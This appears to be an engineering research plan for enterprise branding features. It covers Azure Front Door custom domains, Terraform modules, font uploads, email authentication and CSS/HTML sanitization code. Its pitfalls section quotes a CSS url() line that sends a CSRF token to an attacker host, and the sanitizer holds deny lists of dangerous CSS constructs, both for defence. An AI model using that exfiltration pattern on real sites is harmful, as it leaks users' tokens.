# Phase 51: Enterprise Branding & Deployment - Research

**Researched:** 2026-02-28
**Domain:** Enterprise white-label branding, Azure infrastructure, Terraform IaC
**Confidence:** HIGH (verified with official docs and existing codebase patterns)

## Summary

This phase extends the existing branding service (`apps/backend/src/modules/branding/`) with enterprise-grade customization features and adds Terraform infrastructure-as-code for Azure deployment. The existing codebase already has:

- `TenantBranding` Prisma model with `customDomain`, `colorPalette`, `typography`, and `footerText` fields
- `BrandingService` with CSS generation from color palette
- `StorageProvider` interface with Azure Blob Storage implementation for per-tenant file storage
- Ethics Portal frontend consuming branding via `useTenantBranding` hook and `TenantThemeProvider`

New capabilities needed: Custom domain SSL routing (Azure Front Door), custom font uploads, hero image uploads, custom email sender domains (SPF/DKIM), "Powered by Ethico" removal toggle, footer HTML customization, CSS injection with sanitization, and Terraform modules.

**Primary recommendation:** Extend the existing `TenantBranding` model with new fields (`heroImageUrl`, `customFonts`, `showPoweredBy`, `footerHtml`, `customCss`, `emailSenderDomain`) and add Azure Front Door for custom domain SSL routing with managed certificates.

## Standard Stack

The established libraries/tools for this domain:

### Core

| Library             | Version | Purpose                           | Why Standard                          |
| ------------------- | ------- | --------------------------------- | ------------------------------------- |
| @azure/storage-blob | 12.x    | Blob storage for fonts/images     | Already in use, per-tenant containers |
| azurerm (Terraform) | 4.x     | Azure infrastructure provisioning | Official HashiCorp provider           |
| css-tree            | 3.x     | CSS parsing and sanitization      | W3C-compliant, used by sanitize-html  |
| postcss             | 8.x     | CSS transformation pipeline       | Industry standard for CSS processing  |

### Supporting

| Library        | Version | Purpose                              | When to Use                |
| -------------- | ------- | ------------------------------------ | -------------------------- |
| DOMPurify      | 3.x     | HTML sanitization for footer HTML    | Footer HTML customization  |
| file-type      | 19.x    | MIME type detection for font uploads | Font file validation       |
| @azure/arm-cdn | 9.x     | Azure CDN/Front Door management      | Custom domain provisioning |

### Alternatives Considered

| Instead of          | Could Use                 | Tradeoff                                             |
| ------------------- | ------------------------- | ---------------------------------------------------- |
| Azure Front Door    | Azure Application Gateway | Front Door is better for global CDN + custom domains |
| css-tree            | postcss-sanitize          | css-tree has better W3C compliance for validation    |
| Azure managed certs | Let's Encrypt             | Managed certs require zero maintenance               |

**Installation:**

```bash
# Backend dependencies
npm install css-tree file-type

# Terraform (already should be installed system-wide)
# No npm packages needed for IaC
```

## Architecture Patterns

### Recommended Project Structure

```
apps/backend/src/modules/branding/
├── branding.service.ts        # Extend with new methods
├── branding.controller.ts     # Add endpoints
├── dto/
│   └── branding.dto.ts        # Add new DTOs
├── types/
│   └── branding.types.ts      # Add new types
├── services/
│   ├── font-upload.service.ts     # NEW: Font validation & storage
│   ├── css-sanitizer.service.ts   # NEW: CSS sanitization
│   └── domain-routing.service.ts  # NEW: Azure Front Door integration
└── validators/
    └── font-validator.ts          # NEW: Font file validation

infrastructure/
├── terraform/
│   ├── main.tf                    # Root module
│   ├── variables.tf               # Input variables
│   ├── outputs.tf                 # Output values
│   ├── modules/
│   │   ├── app-service/           # App Service module
│   │   ├── postgresql/            # PostgreSQL Flexible Server
│   │   ├── redis/                 # Azure Cache for Redis
│   │   ├── storage/               # Blob Storage
│   │   ├── frontdoor/             # Azure Front Door + custom domains
│   │   └── search/                # Cognitive Search
│   └── environments/
│       ├── dev.tfvars
│       ├── staging.tfvars
│       └── prod.tfvars
└── README.md
```

### Pattern 1: Custom Domain SSL with Azure Front Door

**What:** Use Azure Front Door Standard/Premium with managed certificates for custom domain SSL.
**When to use:** All enterprise tenants with custom domains (BRAND-01).
**Example:**

```hcl
# Source: https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/cdn_frontdoor_custom_domain
resource "azurerm_cdn_frontdoor_custom_domain" "tenant_domain" {
  name                     = "tenant-${var.tenant_slug}"
  cdn_frontdoor_profile_id = azurerm_cdn_frontdoor_profile.main.id
  host_name                = var.custom_domain # e.g., "ethics.acme.com"

  tls {
    certificate_type    = "ManagedCertificate"
    minimum_tls_version = "TLS12"
  }
}

resource "azurerm_cdn_frontdoor_route" "tenant_route" {
  name                          = "tenant-${var.tenant_slug}-route"
  cdn_frontdoor_endpoint_id     = azurerm_cdn_frontdoor_endpoint.main.id
  cdn_frontdoor_origin_group_id = azurerm_cdn_frontdoor_origin_group.app.id
  cdn_frontdoor_custom_domain_ids = [azurerm_cdn_frontdoor_custom_domain.tenant_domain.id]

  patterns_to_match = ["/*"]
  supported_protocols = ["Https"]
  https_redirect_enabled = true
}
```

### Pattern 2: Font Upload with Validation

**What:** Validate font files before storage, serve with proper CORS headers.
**When to use:** Custom font family uploads (BRAND-02).
**Example:**

```typescript
// Source: Existing StorageProvider pattern + file-type library
import { fileTypeFromBuffer } from 'file-type';

const ALLOWED_FONT_TYPES = new Map([
  ['font/woff2', '.woff2'],
  ['font/woff', '.woff'],
  ['font/ttf', '.ttf'],
  ['font/otf', '.otf'],
  ['application/font-woff2', '.woff2'],  // Alternative MIME
  ['application/font-woff', '.woff'],
]);

async validateFontFile(buffer: Buffer, filename: string): Promise<boolean> {
  const type = await fileTypeFromBuffer(buffer);
  if (!type || !ALLOWED_FONT_TYPES.has(type.mime)) {
    throw new BadRequestException(
      `Invalid font type. Allowed: ${[...ALLOWED_FONT_TYPES.keys()].join(', ')}`
    );
  }
  return true;
}
```

### Pattern 3: CSS Sanitization with Whitelist

**What:** Parse and sanitize custom CSS, removing dangerous properties/values.
**When to use:** Custom CSS injection (BRAND-07).
**Example:**

```typescript
// Source: css-tree documentation + CVE-2026-2441 security guidance
import * as csstree from 'css-tree';

const FORBIDDEN_PROPERTIES = ['behavior', 'expression', '-moz-binding'];
const FORBIDDEN_FUNCTIONS = ['url', 'expression', 'javascript'];

sanitizeCss(input: string): string {
  const ast = csstree.parse(input, { parseCustomProperty: true });

  csstree.walk(ast, {
    enter: (node, item, list) => {
      // Remove @import rules (data exfiltration risk)
      if (node.type === 'Atrule' && node.name === 'import') {
        list.remove(item);
        return;
      }

      // Remove forbidden properties
      if (node.type === 'Declaration') {
        if (FORBIDDEN_PROPERTIES.includes(node.property.toLowerCase())) {
          list.remove(item);
          return;
        }
      }

      // Remove forbidden functions (url(), etc.)
      if (node.type === 'Function') {
        if (FORBIDDEN_FUNCTIONS.includes(node.name.toLowerCase())) {
          list.remove(item);
        }
      }
    }
  });

  return csstree.generate(ast);
}
```

### Pattern 4: Email Domain Authentication

**What:** Configure custom sender domains with SPF/DKIM/DMARC via Azure Communication Services or SendGrid.
**When to use:** Custom email sender domains (BRAND-04).
**Example:**

```typescript
// Source: Azure Communication Services docs
interface EmailDomainConfig {
  domain: string;
  spfRecord: string; // TXT record value
  dkimRecords: {
    // CNAME records
    selector1: string;
    selector2: string;
  };
  verificationStatus: "pending" | "verified" | "failed";
}

// DNS records required for custom domain:
// SPF: v=spf1 include:spf.protection.outlook.com -all
// DKIM: selector1-azurecomm-prod-net._domainkey.domain.com -> CNAME
// DKIM: selector2-azurecomm-prod-net._domainkey.domain.com -> CNAME
```

### Anti-Patterns to Avoid

- **Storing CSS without sanitization:** Always parse and whitelist CSS properties to prevent XSS and data exfiltration via url() functions.
- **Allowing arbitrary @import in CSS:** Can be used for data exfiltration and timing attacks.
- **Self-signed certificates for custom domains:** Use Azure-managed certificates for automatic renewal.
- **Font files without validation:** Always validate MIME type and magic bytes before storage.
- **HTML in footer without sanitization:** Use DOMPurify with strict configuration.

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem                    | Don't Build           | Use Instead                | Why                                       |
| -------------------------- | --------------------- | -------------------------- | ----------------------------------------- |
| SSL certificate management | Custom ACME client    | Azure managed certificates | Auto-renewal, zero maintenance            |
| CSS parsing/validation     | Regex-based sanitizer | css-tree                   | W3C compliant, handles edge cases         |
| HTML sanitization          | String replacement    | DOMPurify                  | Security-audited, handles all XSS vectors |
| Font MIME detection        | Extension-based check | file-type                  | Validates magic bytes, prevents spoofing  |
| DNS record generation      | Manual string concat  | Azure SDK                  | Handles all record types correctly        |
| Terraform modules          | From-scratch          | azurerm provider           | Battle-tested, documented                 |

**Key insight:** Security features (CSS/HTML sanitization, certificate management) have too many edge cases for custom implementations. Use battle-tested libraries.

## Common Pitfalls

### Pitfall 1: CSS url() Data Exfiltration

**What goes wrong:** Custom CSS with `background: url('https://attacker.com/log?csrf=...')` can exfiltrate data.
**Why it happens:** CSS properties like background-image, cursor, list-style-image accept url() functions that make HTTP requests.
**How to avoid:** Strip all url() functions from custom CSS using css-tree parser.
**Warning signs:** CSS containing url(), @import, or any external resource references.

### Pitfall 2: Font File Spoofing

**What goes wrong:** Attacker uploads malicious file with .woff2 extension containing executable code.
**Why it happens:** Only checking file extension, not actual content.
**How to avoid:** Validate both MIME type and magic bytes using file-type library.
**Warning signs:** MIME type mismatch between declared and detected types.

### Pitfall 3: Custom Domain DNS Propagation Delays

**What goes wrong:** Custom domain shows "pending" for hours after DNS configuration.
**Why it happens:** DNS TTL propagation, Azure validation timing.
**How to avoid:** Set DNS records before enabling in Azure, document 15-30 minute validation window.
**Warning signs:** TXT record not resolving via nslookup within 30 minutes.

### Pitfall 4: Email SPF/DKIM Misconfiguration

**What goes wrong:** Emails from custom domain go to spam or are rejected.
**Why it happens:** Multiple SPF records, incorrect DKIM selector, missing DMARC.
**How to avoid:** Only one SPF TXT record per domain, use Azure-provided DKIM CNAMEs.
**Warning signs:** SPF ~all instead of -all, multiple SPF records on same domain.

### Pitfall 5: Terraform State Conflicts

**What goes wrong:** Multiple users running Terraform cause state corruption.
**Why it happens:** Local state files without remote backend.
**How to avoid:** Use Azure Blob Storage backend with state locking from day one.
**Warning signs:** State file conflicts, resource already exists errors.

## Code Examples

Verified patterns from official sources:

### Prisma Schema Extension

```prisma
// Extend existing TenantBranding model
model TenantBranding {
  // ... existing fields ...

  // NEW: Enterprise branding fields
  heroImageUrl     String?  @map("hero_image_url")
  showPoweredBy    Boolean  @default(true) @map("show_powered_by")
  footerHtml       String?  @map("footer_html")        // Sanitized HTML
  customCss        String?  @map("custom_css")         // Sanitized CSS
  emailSenderDomain String? @map("email_sender_domain")
  emailDomainStatus String? @map("email_domain_status") // pending|verified|failed

  // JSON field for custom fonts (array of font definitions)
  customFonts      Json?    @map("custom_fonts")
}
```

### Custom Font Upload Endpoint

```typescript
// Source: Existing StorageProvider pattern
@Post('fonts')
@UseInterceptors(FileInterceptor('file'))
async uploadFont(
  @UploadedFile() file: Express.Multer.File,
  @TenantId() orgId: string,
  @Body('fontFamily') fontFamily: string,
  @Body('fontWeight') fontWeight: string = '400',
  @Body('fontStyle') fontStyle: string = 'normal',
) {
  // Validate font file
  await this.fontUploadService.validateFontFile(file.buffer, file.originalname);

  // Upload to tenant storage
  const path = `fonts/${fontFamily}-${fontWeight}-${fontStyle}.woff2`;
  const result = await this.storageProvider.uploadFile({
    organizationId: orgId,
    path,
    content: file.buffer,
    contentType: 'font/woff2',
    metadata: { fontFamily, fontWeight, fontStyle },
  });

  // Update branding config
  await this.brandingService.addCustomFont(orgId, {
    fontFamily,
    fontWeight,
    fontStyle,
    url: result.url,
  });

  return { url: result.url };
}
```

### Terraform Azure Front Door Module

```hcl
# Source: https://learn.microsoft.com/en-us/azure/frontdoor/create-front-door-terraform
resource "azurerm_cdn_frontdoor_profile" "main" {
  name                = "ethico-frontdoor"
  resource_group_name = azurerm_resource_group.main.name
  sku_name            = "Standard_AzureFrontDoor"
}

resource "azurerm_cdn_frontdoor_origin_group" "app" {
  name                     = "app-origin-group"
  cdn_frontdoor_profile_id = azurerm_cdn_frontdoor_profile.main.id
  session_affinity_enabled = true

  health_probe {
    path                = "/health"
    protocol            = "Https"
    interval_in_seconds = 30
  }

  load_balancing {
    sample_size                 = 4
    successful_samples_required = 3
  }
}

resource "azurerm_cdn_frontdoor_origin" "app" {
  name                          = "app-origin"
  cdn_frontdoor_origin_group_id = azurerm_cdn_frontdoor_origin_group.app.id
  host_name                     = azurerm_linux_web_app.backend.default_hostname
  http_port                     = 80
  https_port                    = 443
  priority                      = 1
  weight                        = 1000
  certificate_name_check_enabled = true
}

resource "azurerm_cdn_frontdoor_endpoint" "main" {
  name                     = "ethico-endpoint"
  cdn_frontdoor_profile_id = azurerm_cdn_frontdoor_profile.main.id
  enabled                  = true
}
```

### CSS Sanitizer Service

```typescript
// Source: css-tree docs + security research
import * as csstree from "css-tree";

@Injectable()
export class CssSanitizerService {
  private readonly logger = new Logger(CssSanitizerService.name);

  private readonly FORBIDDEN_PROPERTIES = new Set([
    "behavior",
    "expression",
    "-moz-binding",
    "position",
    "z-index",
  ]);

  private readonly FORBIDDEN_AT_RULES = new Set(["import", "charset"]);

  private readonly FORBIDDEN_FUNCTIONS = new Set([
    "url",
    "expression",
    "javascript",
  ]);

  sanitize(css: string, maxLength: number = 50000): string {
    if (css.length > maxLength) {
      throw new BadRequestException(
        `CSS exceeds maximum length of ${maxLength} characters`,
      );
    }

    try {
      const ast = csstree.parse(css, {
        parseCustomProperty: true,
        parseValue: true,
      });

      csstree.walk(ast, {
        enter: (node, item, list) => {
          // Remove forbidden at-rules
          if (
            node.type === "Atrule" &&
            this.FORBIDDEN_AT_RULES.has(node.name)
          ) {
            list.remove(item);
            return;
          }

          // Remove forbidden properties
          if (node.type === "Declaration") {
            if (this.FORBIDDEN_PROPERTIES.has(node.property.toLowerCase())) {
              list.remove(item);
              return;
            }
          }

          // Remove forbidden functions
          if (node.type === "Function") {
            if (this.FORBIDDEN_FUNCTIONS.has(node.name.toLowerCase())) {
              list.remove(item);
            }
          }
        },
      });

      return csstree.generate(ast);
    } catch (error) {
      this.logger.warn(`CSS parse error: ${error.message}`);
      throw new BadRequestException("Invalid CSS syntax");
    }
  }
}
```

## State of the Art

| Old Approach             | Current Approach             | When Changed | Impact                         |
| ------------------------ | ---------------------------- | ------------ | ------------------------------ |
| Azure Front Door Classic | Front Door Standard/Premium  | 2023         | New SKU with better features   |
| Self-managed SSL certs   | Azure managed certificates   | 2023         | Automatic renewal via DigiCert |
| Azure CDN custom domain  | Front Door custom domain     | 2023         | Unified global CDN + WAF       |
| SendGrid single-tenant   | Azure Communication Services | 2024         | Native Azure integration       |
| Manual DNS validation    | Azure pre-validated domains  | 2024         | Faster domain onboarding       |

**Deprecated/outdated:**

- Azure Front Door Classic: Being retired, use Standard/Premium SKU
- DigiCert G1 root certificate: Expiring April 2026, auto-renewed to G2
- Manual DKIM key management: Use Azure-provided CNAME records

## Open Questions

Things that couldn't be fully resolved:

1. **Multi-region Front Door deployment**
   - What we know: Front Door supports multiple origins across regions
   - What's unclear: Optimal configuration for failover between Azure regions
   - Recommendation: Start with single-region, add failover in later phase

2. **Custom font licensing compliance**
   - What we know: Fonts stored per-tenant in Azure Blob Storage
   - What's unclear: License verification for uploaded fonts (commercial vs open source)
   - Recommendation: Add disclaimer in UI, don't validate licenses programmatically

3. **Email domain verification automation**
   - What we know: DNS records must be configured manually by tenant
   - What's unclear: Whether to build admin UI for DNS record guidance
   - Recommendation: Generate DNS records, provide copy-paste instructions

## Sources

### Primary (HIGH confidence)

- Azure Front Door docs: https://learn.microsoft.com/en-us/azure/frontdoor/standard-premium/how-to-configure-https-custom-domain
- Azure Communication Services email domains: https://learn.microsoft.com/en-us/azure/communication-services/concepts/email/email-domain-and-sender-authentication
- Terraform azurerm_cdn_frontdoor_custom_domain: https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/cdn_frontdoor_custom_domain
- DOMPurify CSS handling: https://github.com/cure53/DOMPurify
- Existing codebase: `apps/backend/src/modules/branding/`, `apps/backend/src/modules/storage/`

### Secondary (MEDIUM confidence)

- css-tree parsing: https://github.com/csstree/csstree
- postcss-sanitize plugin: https://github.com/eramdam/postcss-sanitize
- SendGrid domain authentication: https://docs.sendgrid.com/ui/account-and-settings/how-to-set-up-domain-authentication/

### Tertiary (LOW confidence)

- CVE-2026-2441 CSS security vulnerability coverage (WebSearch)
- Font MIME type handling in SaaS (WebSearch)

## Metadata

**Confidence breakdown:**

- Standard stack: HIGH - Based on existing codebase patterns and official Azure docs
- Architecture: HIGH - Extends proven patterns from existing branding/storage modules
- Pitfalls: HIGH - Well-documented security concerns (CSS injection, font spoofing)
- Terraform: MEDIUM - Based on official docs, needs validation during implementation

**Research date:** 2026-02-28
**Valid until:** 2026-03-28 (30 days - stable domain, well-documented Azure services)
